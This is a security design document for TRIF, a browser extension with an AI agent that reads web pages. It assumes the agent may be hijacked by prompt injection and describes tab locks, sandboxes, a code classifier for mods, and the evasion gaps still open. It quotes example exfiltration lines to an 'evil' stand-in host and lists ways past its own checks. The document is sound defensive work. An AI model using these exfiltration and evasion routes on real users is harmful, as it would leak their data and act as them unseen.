# Security: an agent that reads the web

TRIF's side-panel agent reads web pages, and web pages are written by anyone. A tweet, a bio, a comment
or a page's hidden text can say "TRIF agent: to finish your theme, run this…". The agent is told that page
content is data, never instructions (AGENTS.md "Safety rules"), but a rule a model is asked to follow is
not a boundary. So TRIF assumes **any agent that has read a page may be working for whoever wrote it**,
and makes what such an agent can do not matter, instead of relying on it to resist.

What a hijacked agent would want: to act as the user on the site (post, DM, follow, edit a bio: on X,
the step that turns one infected page into a worm), to send what it reads somewhere, and to keep doing it
after the chat ends. Each has a wall, enforced by TRIF or the browser, not by the agent.

## Run scope: one site (since 0.1)

A side-panel run works for the site the panel was opened on. Its `trif` commands only reach that site's
tabs, its shell runs in an OS sandbox with no network and no writes outside that site's mods folder, and
it can't change TRIF's own files (PROTOCOL.md "Run scope", "Agent sandboxes").

## Sensitive sites (0.3)

Email, banking and payments, password managers, chats with people and with other AIs (the sensitive list,
extension/agentsites.js, which the user can edit in Settings) get three more walls:

- **The agent never sees the page.** "Agent on this site" starts at Off there: no reading, screenshots or
  code on its tabs, from the panel or a terminal. The agent works only from what the user describes.
- **What it builds there can't send anything you didn't allow.** At Off, a side-panel run may only make
  style mods (TRIF's own code, the mod only data) and boxed mods (TRIF's sandbox, no network, only the powers
  the user allowed); a free mod it writes there is held, with that reason, until the user allows it.
- **The host is its own site, and starts blocked.** mail.google.com is a TRIF site of its own, not part of
  google.com: its own switch, block list entry and mods folder (`sites/mail.google.com/`). google.com's
  mods and all-sites mods never run on it (excluded when registered, and so are TRIF's runtimes), its own
  mods run only there, and a run there is scoped to it, its sandbox writing only that folder; a google.com
  run can't reach its tabs or write its folder. TRIF puts each sensitive site on its block list once, so
  nothing from TRIF runs there or reads it until the user unblocks it. (An update asks first about a host
  the user's mods already reach: keep TRIF on there, with its own copies of those mods, or block it.)
- **Every mod starts off there** (November 2026), not only the agent: a mod new to the browser in a sensitive
  site's folder is off until the user switches it on there, the side panel's chat's too, whatever "Mods your
  chat makes" says (lib.js applyNewMods, newOff `sensitive`), and a change the chat makes to one that's on
  waits for the user while the version before runs (applyChatWaiting). An agent run can't switch them on.
  The parent's and all-sites mods never run there at all (above). What the user already had on there stays
  on: only mods TRIF sees for the first time start off, and "Keep TRIF on there" still copies the parent's
  mods with their switches, as they were already running there.

## Agent code in a tab: in the box, or the tab is locked (0.3)

Most of what an agent runs on a page is looking: count these, read that element's text or style. So from a
side-panel chat `trif run` runs in **TRIF's box** unless the agent says `--page`: the sandbox world boxed mods
run in, a compartment with their API and two reads (the page's data behind an element, what's typed in its
fields; never a password or card field), for as long as the run lasts. There the code can't send, click,
type or navigate, so nothing is locked, the site keeps working in every tab, and the user isn't asked first.
What it can do is what a boxed mod with no powers can: read what the page shows and change what it shows
(so the clickjacking gap of the safe tiers applies to it too). The page's own world is still there, for
what needs the site's own code, with everything below.

`trif run --page` runs the agent's JavaScript in the page, logged in. Before a side-panel run's code runs in a
tab, TRIF locks the tab (extension/tablock.js): declarativeNetRequest session rules, applied by the
browser to that tab, block every request that changes something (POST, PUT, PATCH, DELETE: fetch, XHR,
sendBeacon, form posts, of any kind), every WebSocket, and anything that could carry what the page shows
to another site whatever its method: going to another site's page (`location = "https://evil/?" +
data`), a frame, fetch, XHR or event stream to one, and images, scripts, styles, fonts and media from a
site the page hadn't already loaded from when the lock started (TL-1: `new Image().src =
"https://evil/?" + data`). The page keeps loading from the sites it used (X's twimg.com); a site it only
starts using after the lock (a lazy-loaded image from a new CDN) is blocked until the reload. Page code
can't get around a rule the browser applies; the agent's code, and anything it leaves behind (timers,
wrapped functions), lives only as long as the page does. The lock lasts until the tab shows a new
document: a reload or a real navigation.
- It's the document that counts, not the URL (a single-page site changes the URL without a new
  document, and so could the agent's code): a marker in the extension's isolated world, which page code
  can't see or set, is set in the document when the lock starts, and the lock lifts when the tab's
  document doesn't have it.
- A document restored from the back/forward cache brings its code back: its marker locks the tab again
  and reloads the page.
- Tabs a locked tab opens are locked while it is.
- **The whole site, completely, while one of its tabs is locked** (TL-2, TL-4, TL-5; Tim, 2026-11-13: the
  lock is only for code that needs more than the box, so it can be the whole site):
  - every other tab of the site gets the same rules as the tab the code ran in (no writes or sockets, nothing
    to or from another site but the pictures, scripts and styles the site's pages already loaded, from any of
    its tabs, when the lock started), and so does a tab of the site opened during the lock, a tab one of its
    tabs opens, and a tab that comes to the site. They show the paused notice ("your agent ran code in
    another tab", with a button to show it);
  - and rules on what the site's pages start (`initiatorDomains`), in every tab and in none: no writes or
    sockets, no request to another site and no navigation toward one (a popup, `noopener` or not, blocked at
    its first request, before TRIF has even seen the tab; a window found by name, a targeted link or form; a
    frame), no subresource from a site none of its pages used. Those cover requests no tab owns (tabId −1:
    a SharedWorker made from a `blob:` URL, the site's own service worker passing a fetch through), the
    moments before a new tab of the site has rules of its own, and a window of another site the code finds
    by name: the site can only send it to the site.
  The user's own new tabs (typed addresses, bookmarks) have no initiator and load as usual, wherever they
  go. The other tabs unlock when the last tab the agent ran code in unlocks. Several tabs with agent code:
  each unlocks on its own new page, and the site stays locked until all of them have. A tab of the site that
  goes to another site is let go (a typed address in it is blocked, as in the agent's tab, and the browser's
  blocked page has nothing of the site's: a reload then loads it). Cost: while the lock lasts, the user can't
  post from the site's other tabs, follow links out of them, or type another site's address into one of them.
- **What the code leaves in the site's storage** (TL-3):
  - The agent's code can't save: before it runs, TRIF wraps the page's storage writers (localStorage and
    sessionStorage, their methods and named properties; IndexedDB open, delete and object-store and
    cursor writes; `document.cookie` and `cookieStore`; Cache Storage; service worker registration) to
    refuse a call while the agent's code is on the call stack, told by the `sourceURL` its run code gets
    (`trif-run-<runId>.js`). The error says "TRIF: your agent's code can't save data on this site", and
    reaches the agent. The site's own calls pass untouched. A speed bump, not a wall: a wrapped function
    the code hands to the browser to call later (bound, through a microtask, or as a native callback)
    runs with no agent code on the stack; a realm the guard misses (a frame reached some other way, a
    window the code opens) has the originals. Same-origin frames the page reaches through `contentWindow`
    or `contentDocument` get the guard too.
  - When the lock starts, TRIF takes a fingerprint of the site's stored state from the isolated world
    (Cache Storage names and keys, service worker registrations, localStorage and sessionStorage,
    IndexedDB names and versions, the cookies the page can see) and compares it on the new page, before
    unlocking (the lock's rules still apply to that page). Cache Storage or service workers changed:
    TRIF clears just those, for the site's origin, from the isolated world (no `browsingData`
    permission: TRIF doesn't have it, and Firefox would ask for it in an update), reloads past the cache,
    then unlocks. localStorage, sessionStorage, IndexedDB or cookies changed (big sites write their own
    all the time): it unlocks as usual and adds one quiet line to the site's chat ("<site> saved new data
    while your agent's code ran. If something on <site> acts strangely, clear its site data in the
    browser's settings."). Not compared: IndexedDB's contents; HttpOnly cookies (page code can't set them
    either).
- **Leak channels that aren't requests** (TL-6): before the agent's code, TRIF puts WebRTC's
  constructors out of reach in the page (they throw), drops `<link>`s that prefetch, preconnect,
  prerender or modulepreload, and turns speculation rules into a script type that does nothing, also in
  frames of the page's own origin as the page reaches into them (extension/tablock.js `leakGuard`). That
  is a speed bump, not a wall: it runs in the page's own world, so a realm it misses (a frame reached
  some other way, a window the code opens) has the originals; a `<link>` written as HTML is removed only
  after the browser may have acted on it; DNS prefetch the browser does on its own; and an extension
  can't stop WebRTC fully without the `privacy` permission, which TRIF doesn't ask for.
- No lock, no code: if the lock can't be set up (no declarativeNetRequest; a browser that drops the
  per-tab or initiator condition, checked by reading the rules back), `trif run` fails and the code
  doesn't run.
- **A GET to the site itself passes.** The lock stops what sends: the methods that change something, sockets,
  and anything to another site. A request with no body to the site's own address (a page load, a GET fetch,
  an image from the site) passes, because the page has to load and to read: X's timeline, its pictures, the
  next page of a feed are all GETs, and blocking them would break every site the agent works on. A site that
  changes something on a GET (an old-style `/delete?id=1` link, a "mark as read" or a follow behind a GET, a
  logout link) isn't covered: the agent's code could do that, as the user, on that site. That's accepted: it
  stays on the user's own site (nothing reaches another one), the site already has to defend those addresses
  against any page that links to them (they're cross-site-request-forgery holes for every other site on the
  web too, so sites that care don't do it), and telling such a GET apart from a read isn't something a rule
  can do. "Can't post or send as you" means the methods above.
- Reading the page, clicks, key presses and the mod's own test events work as before: in 50 real runs,
  every input an agent sent was to drive its own mod, none needed to send a request.
- The page's own requests in that document are blocked too (X's "Something went wrong"), and links to
  other sites don't open from it. The panel says the tab is locked, in one line with a button that
  reloads it (or, when the tab was sent to a blocked page, takes it back to the page it was locked on),
  and TRIF's toolbar icon for that tab shows the robot with a pause sign for eyes until it unlocks.

- **The tab that opened it.** A locked tab's code can reach the tab that opened it through
  `window.opener` when both are the site's, and run there. A tab the site's rules cover is let go when the
  site unlocks, without a new page, so code that moved there would carry on unlocked. So the opener, on the
  same site, is locked as a tab with agent code too: the tab's full rules, until it shows a new document
  (and its own opener in turn). A window of the site's found by a name is a tab of the site, so it has the
  full lock already.

Not covered: a message the code posts to a window of another site it can reach (its opener, a window found
by name, a frame of another site in the page): `postMessage` isn't a request, and that window's page isn't
locked; a cross-site subresource that matches a site the page already used (its address can still carry data
there); what
TL-6 above leaves open; the contents of IndexedDB. A page restored from the back/forward cache could run
for a few milliseconds before it's locked again. The terminal's `trif run` (the user's own agent, which
already has their shell) doesn't lock. docs/TABLOCK-AUDIT.md has each item and what the tests showed.

## Mods: held by what their code does (0.3)

A mod runs on every page load, unattended, logged in: what a hijacked agent would leave behind. TRIF
reads every mod's code (helper/lib/powers.js) for what it can do:

| key | what it means | found by |
|---|---|---|
| `sends` | sends requests or messages as the user | `fetch`, `XMLHttpRequest`, `sendBeacon`, `WebSocket`, `EventSource`, forms' `submit`, `postMessage`, workers |
| `acts` | clicks, types or presses keys for the user | `.click()`, `dispatchEvent` of a UI event, `new MouseEvent`/`KeyboardEvent`…, `execCommand`, the clipboard |
| `navigates` | sends the page somewhere | writing `location`, `window.open` |
| `loads` | loads from an address it works out while running | `src`/`href`/`url(…)` set from something worked out at run time |
| `site:<host>` | names another site | URL literals for hosts outside the mod's sites |
| `hidden` | code TRIF can't check | `eval`, `Function`, string timers, `import()`, `<script>`/inline handlers in HTML, names built from decoded strings, code TRIF reads differently from the browser |

It reads tokens, not text (comments and strings aren't code; `window['fe'+'tch']`, `fetch` and
template keys are), and checks its own reading against the JavaScript engine: the code with every string,
template and regex replaced by something holding a line break must compile, or the reading was wrong (a
division the browser reads as a regex, hiding a call in what looks like a string) and the mod is `hidden`.
It's conservative: what it can't follow is `hidden`, so getting past it takes code that looks like
nothing at all. The mod's `@risk` header plays no part: whoever wrote the code wrote the header.

- **Held** (helper/lib/held.js), whoever wrote it: any mod that's new or changed since TRIF last let it
  run (`~/.trif/seen.json`) doesn't run while it can do something not allowed for it. That covers a
  side-panel agent's mods, a terminal agent's, a file pasted or copied in, a mod someone shared. A
  side-panel run's mod is also held for matching other sites or saying risk 2. The panel shows TRIF's
  facts, and apart from them what the mod says about itself (labelled as the agent's when an agent in
  the panel wrote it); Allow and Show code. `trif approve` from the user's terminal does the same.
- **Allowed** (`~/.trif/allowed.json`, which runs can't write): each power, and the lines that use it. A
  later edit runs straight away unless it adds a power or adds or changes a line that uses one, so no one
  can quietly rewrite what an allowed mod sends, and edits to the rest (its CSS) don't ask again.
- **Review**: mods the user had when this started (the first time, seen.json missing) keep running; one
  that can do something not yet allowed shows its facts once in the panel ("Looks right" allows them).
  Edited, they're held like any other. A mod TRIF ships is judged against its shipped version
  (`~/.trif/.shipped/`, which runs can't write, written before the mod itself): an unchanged one, or an
  update TRIF brings, has nothing to ask about, nor has an edit that reuses its lines. An edit that adds a
  power, a line using one, a site its URLs name, or (while the mod can do anything) a `@match` for a host
  the shipped version doesn't run on waits, whoever made it (held.js `shippedSiteNeeds`): Tim's mod that
  may send on x.com, now also on the user's bank, is a change in what that power means.
- **Style sections** (helper/lib/stylesection.js): a boxed or free mod's `// ==Style==` block right after
  its header (CSS, a hide list, typed settings) is applied by TRIF, and a change to it alone runs without a
  question: held.js compares the code's own hash (`codeHash`: the file without the section, plus what each
  setting is) with the version that last ran. The condition is that the code can't read the section as
  text, or a "style" change could carry code or an address into it. So the helper strips it before
  anything reads the code: what TRIF reads for powers, hashes as the code and sends to the browser has
  those lines blank, whatever surrounds them (inside a template literal too). The browser gets the CSS TRIF
  built (checked as a style mod's: nothing loads from an address) and the settings' values, checked against
  their types (a number in its range, a colour, true or false, one of a list of words), which the code reads
  as `trif.style`; what a setting is (its range, its choices) is part of the code. The CSS is on the page,
  where page code can see how things look, exactly as with any style mod (which an agent may write without
  asking), so a style section gives the code nothing a style mod couldn't already put in front of it, plus
  those few typed values. A run's change to the section of a mod that matches outside the run's site still
  waits for that, as a style mod's would. A change to both parts waits for its code; the version that keeps
  running meanwhile gets the new CSS and the values its own settings take (stylesection.js `restyle`).

Writes through a name worked out at run time (`x[k] = v`, `setAttribute(k, v)`) can't be told apart from
setting an element's `src` or `href` by reading the code: whether `k` can be `"src"` is undecidable. TRIF
stays strict: such a write counts whenever the mod's text mentions a load attribute anywhere, including
spelled from literal pieces (`'sr' + 'c'`, `['s','r','c'].join('')`, `'sr'.concat('c')`), or the mod
decodes strings it can't read. That flags ordinary array writes in some mods; the answer is in the
instructions, not a looser rule: TECHNIQUES.md "Writing mods TRIF can read" tells agents the plain way
round each pattern, and `trif check` shows them what TRIF reads, line by line, before anything waits.

How far this reading goes, plainly: it's a list of known ways to send, act, load or hide, and it catches
the common spellings of each, not every one. JavaScript and the browser offer many routes to the same
thing (Object.assign onto an element, setAttributeNS, a property's setter taken out by name, CSS loaded
from a style element's text, and, above all, the page's own functions: a mod can call the site's own code
to post or fetch without writing either word). An agent writing to get past it can. So "TRIF finds
nothing" means "nothing TRIF knows how to spot", not "safe": the holds are a checkpoint for honest code
and lazy attacks, and the walls are elsewhere: the tab lock for an agent's live code, the run scope and
sandbox, and (planned) mods that run where they can't act at all (docs/SAFE-MODS.md).

Not covered: a mod reusing an allowed function of its own (an approved `send(x)` called with new data
from a new line). A terminal agent (which has the user's shell) could run `trif approve` or edit
allowed.json itself; AGENTS.md tells it never to, but only the side panel's sandbox enforces it. A dev
mode that skips these checks, for people who'd rather not be asked, may come later, with a warning.

## Review fixes (November 2026)

A review of main (0.2.7 plus the 0.3 work) found places where a wall above didn't hold. What was closed, on
branch `fable`; tests/hardening.test.js has one test per item, and tests/css-browser.test.js runs the CSS
check's allowed cases in a real Chromium.

- **Names as code.** A mod's id is its folder's and file's names, and it was written as it was into the
  `//# sourceURL=` comment of the code TRIF generates. The scanner took any name: one with a line break
  (U+2028 and U+2029 are line breaks to JavaScript) ended the comment, and the rest of the name ran, for a
  boxed mod outside its compartment, in TRIF's world. Now the scanner skips such names (pathcheck.js
  unsafeName) and the id goes into that comment only as plain characters (sandbox.js scriptName).
- **CSS read the browser's way.** Both checks read a quoted string on to the next quote; CSS ends one at a
  line break. And they took `/*` inside an unquoted `url()` for a comment; to a browser it's part of the
  address. Either way, text the check took for a string's or a comment's was live CSS, unseen. Five such
  cases loaded from another address in Chromium. The style tier and `trif.css` are the two tiers that never
  wait, so this was a way out of both. One reading now, `cssScan`, in both places.
- **Whose stand-in.** A boxed mod's element stand-ins were shared by every mod, and after an `await` the acting
  mod was read off the call stack by its script's name. A stack holds function names, which a mod chooses. Now
  a stand-in belongs to one mod and acts as it.
- **An agent's navigation.** `trif navigate` and `trif open` checked the address they were given and nothing
  after: a redirect on the run's own site could take the tab, and whatever the address carried, to another
  site, with no lock (no code ran) and at the Look level. Now the tab's page loads are kept to the site
  while it loads (PROTOCOL.md "Run scope", "Navigation").
- **Links in the mods folder.** A site folder that was a link counted as another site's folder the run
  couldn't write, so a mod reached through it wasn't held as the run's; and a chat's delete and restore, done
  by the helper outside any sandbox, followed such a link into another site's folder.
- **A free mod for every site.** Allowed once, its `match:` was allowed for good, so a later run on any site
  could change what runs on all of them. Now a run's change to one waits again.
- **Smaller.** Unnamed methods ("other") and WebTransport in a locked tab; a screenshot is of the tab that
  was checked or there is none; `text`, `sweep` and the rest re-check for a sensitive site of its own;
  `rewrite-requests` never reaches a prototype; style mods' text replacement skips editors by what the browser
  says; new mods wait when working out the holds fails; an agent older than TRIF's minimum isn't started;
  Claude Code runs can't write `allowed.json`, `seen.json` or an instructions file under the mods folder; the
  key proxy refuses dot segments; report lines are scrubbed before they're cut; the Safari bridge's log lines
  are one line each.
- **Code in the box.** A chat's `trif run` runs in TRIF's box unless it says `--page` (above), so the lock,
  and the question before it, are for the runs that ask for the page's own world. The tab that opened a
  locked tab, on the same site, is locked with it.
- **Narrower powers.** `write-drafts` doesn't write while the user is pressing a button or Enter (a draft
  swapped as it's sent, unseen). `@click` words in quotes are what the thing has to say, checked at each
  click against the page's own text.

- **Secrets out of process arguments** (branch release-keys). Any process of the same user can read another's
  arguments and initial environment while it runs (`ps`, sysctl KERN_PROCARGS2, sandbox or not), so neither
  holds a secret now. The release key goes to the keychain on `security -i`'s stdin, as hex (release.js
  saveKeychainItem, read back after; the same way keyring.js has saved API keys since 0.2.0). The
  addons.mozilla.org key and secret are no longer in web-ext's environment: web-ext reads them from the
  keychain itself, through its config file (scripts/web-ext-amo.cjs). And the key proxy's address in Codex's
  `-c` arguments opens nothing by itself: Codex's proxy (open models, and plain runs with an API key) wants a
  token, which Codex reads from a 0600 file in the run's own folder, unreadable to the run's commands, by
  its provider's `auth` command (codex.js proxyAuth; keyproxy.js token mode).
- **The update feed expires** (branch release-keys). latest.json carries the time it was signed (`signed`),
  and the helper refuses a feed signed more than 8 weeks ago (update.js feedTooOld), so an old signed feed
  served again can't keep a user on a version with a known hole for longer than that while saying they're up
  to date; the panel says why it isn't using it. 8 weeks: a few release gaps, so a quiet month doesn't stop
  updates; `release.js refresh-feed` signs the same feed again between releases. Feeds from before have only
  `published` (signed too, and in every feed release.js ever wrote): they're dated by it, so the rule needs no
  cutoff date. Releases before this one ignore the new field.
Then, on branch `site-lock` (tests/tablock.test.js, tests/hardening.test.js, tests/extension.test.js, and
the e2e's tabLockHardeningCheck and wideBCheck):

- **The whole site, completely.** While agent code from `trif run --page` is in one of a site's tabs, every
  tab of the site has that tab's full lock, not only the write block (above): another tab's fetch, image
  beacon or navigation to another site is blocked, and the site can't send any tab to another site, a window
  found by name or reached by a targeted link or form among them. Box runs still lock nothing.
- **Sensitive sites: every mod starts off there**, the chat's too, and the chat's changes wait (above).
- **`rewrite-requests`: what a rule may write**, not only which field. A rule only changes a field the request
  already has (it never adds one, so the names in its header carry nothing to the site), and only in place of
  a value of its kind: `true` or `false` for a boolean, a number for a number, `null` for anything, and a word
  only in place of the words its header names (`variables.sort=Top→Recent`, `Top|Popular→Recent`). A bare
  word is refused, in the header (helper/lib/boxpowers.js) and on the page's side (runtime.js), so no text of
  the mod's author's, and nothing the agent read, can take the place of the user's words in a post or a
  profile field. No mod TRIF ships or converted uses the power; the e2e's fixture now says `mode=loud→quiet`.

Still open, known, and why:

- **A shipped mod's lines are allowed for its edits.** A mod with `@source webmods` and a shipped id is judged
  on what it adds to the shipped version (held.js shippedBaseline), so a run's rewrite that reuses the shipped
  version's lines isn't held. Closing it would ask the user each time their agent customises one of Tim's mods,
  which is what TRIF is for. This is the free tier's terms: adding Tim's mods is the first OK for what they
  can do. The panel now says "changed" beside "Tim's mod" when the file isn't a version TRIF shipped.
- **Other tabs of a locked site** still load from other sites and follow links out (TL-4's cost was the
  user's own posting; this one would be their own links). Agent code reaches such a tab only through a window
  reference: the opener is now locked in full; a window found by name isn't.
- **Same-site GETs.** A request with no body to the site itself passes the lock, so a site that changes
  something on a GET is not covered. "Can't post or send as you" means the methods above.
- **Replays inside the 8 weeks.** An old feed younger than 8 weeks still passes (nothing remembers the newest
  feed seen, since GitHub's cache can briefly serve the one before, and that would read as an attack). Not
  covered at all: `updates/firefox.json`, Firefox's update manifest, which Firefox reads unsigned (the add-on
  it points at is Mozilla-signed, and Firefox only moves forward) and which can't carry an expiry Firefox
  checks.
- **Claude Code's key proxy address** (a plain Claude Code run with an API key saved) is in its environment,
  `ANTHROPIC_BASE_URL`, secret path and all. The run's commands can't reach the proxy (no network); another
  process of the same user that reads the address while the run goes could use the run's key until the run
  ends. Claude Code's `apiKeyHelper` setting (a command whose output it sends as the key) may carry a token
  the way Codex's `auth` does; not tried here (claude.js is another workstream's).
- **The provider `auth` command** was checked on Codex 0.166 only. An older Codex that ignores it sends no
  token, and its runs through a key proxy fail with a message saying to update Codex (nothing is sent
  without the token).
- **A message to a window of another site.** The locked page's code can `postMessage` to a window of
  another site it can reach (its opener, when the user came from another site's page with one; a window found
  by name; a frame of another site in the page). That isn't a request, so no rule sees it, and that window's
  page isn't locked: it can send on what it gets. It takes a site that both opens the locked site with an
  opener (or frames it) and is the attacker's. A speed bump would be to cut a cross-site `window.opener` in
  the leak guard; it doesn't reach frames or named windows, and some sign-in popups need the opener.
- **The first moments of a new tab of the site.** Its own rules go in when the browser reports the tab
  (tabs.onCreated, onUpdated). Until then the site's rules cover it, which go by who started a request: a
  request from a frame with an opaque origin (a sandboxed `srcdoc` frame) has no initiator they match. Agent
  code would have to reach the new tab and build such a frame in those milliseconds.
- **Same-site GETs** are accepted, and why ("A GET to the site itself passes", above).
- **rewrite-requests numbers.** A number still takes the place of any number the request has in that field
  (up to 15 digits): a field the site keeps to itself, as a rule, and the hold shows the value. A range in the
  header would narrow it further if a mod ever needs one.
- **A sensitive host the upgrade is still asking about** is part of its parent until the user answers, as
  before: the parent's mods and all-sites mods that reach it run there meanwhile (what the user had).
- **The update feed has no expiry**, and the release key is written to the keychain through an argument
  (scripts/release.js keygen). Both are the releasing Mac's to change.
- **A run without TRIF's sandbox** (an organization's settings, with the user's consent) works in its own
  folder like any other, but nothing stops it writing the mods folder itself; such a write is judged as an
  outside change.

## Runs work in a folder of their own (November 2026)

A side-panel run used to write the mods folder itself, and which changes were its own was worked out
afterwards from snapshots and a time window: a mod written more than 10 s after the run's process group ended
passed as the user's, and a process can leave the group (on macOS both agents' commands can: Claude Code runs
each in a session of its own). Now each run works in a copy of the workspace of its own
(`<boxRoot>/<runId>.ws/`, stage.js), its sandbox writes only that copy's `sites/`, and only the helper writes
the mods folder: it copies the run's changes over as they're saved (and the mods folder's into the copy), and
a mod is the run's when it's what the helper copied for it. When the run ends, the copy is synced once more
and removed; what a leftover process writes there goes nowhere. docs/STAGING.md has the design.

## The prompt

The page's address reaches the agent's system prompt as its origin and path only, quoted and capped
(helper/lib/agents/index.js promptUrl): a link's query and fragment are the page's to fill, and the system
prompt is the most trusted thing the agent reads.

## Tests

tests/powers.test.js (what the classifier must find, evasions included), tests/scope.test.js (holds,
allowed lines, review), tests/tablock.test.js (the lock against a stand-in browser), and in real Chrome
and Firefox, tests/e2e/scenario.js hijackedAgentCheck: a stand-in agent posts, beacons, opens a socket,
puts a POST off until after its command, reads with a GET, fetches from another site, sends the tab to
another site with "what it read", and writes a mod whose header says render-only over code that posts.
Neither site may receive any of it; the GET works; the mod is held for its `fetch`, with "render-only"
shown as the agent's claim; the panel's button brings the tab back, unlocked; the terminal's `trif run`
doesn't lock it.
